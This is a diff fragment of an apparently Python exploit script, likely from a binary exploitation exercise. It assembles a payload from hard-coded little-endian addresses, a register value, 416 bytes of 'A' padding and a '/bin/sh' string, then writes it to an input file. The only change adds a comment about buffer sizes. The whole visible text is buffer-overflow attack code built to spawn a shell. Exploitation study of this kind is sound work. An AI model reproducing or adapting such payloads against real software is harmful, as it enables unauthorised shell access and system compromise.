@@ -41,7 +41,7 @@ exploit += "\x80\x85\x04\x08"
 exploit += "\x00\x00\x00\x00"  # edx
 exploit += "\x42\x85\x04\x08"
 
-exploit += "A" * 416           # buffer full
+exploit += "A" * 416           # buffer full : linux maximum 8196 (7680 + 32 + 32 + 32 + 416 + 4 )
 exploit += "/bin/sh\x00"
 
 f = open("in.txt", "w")
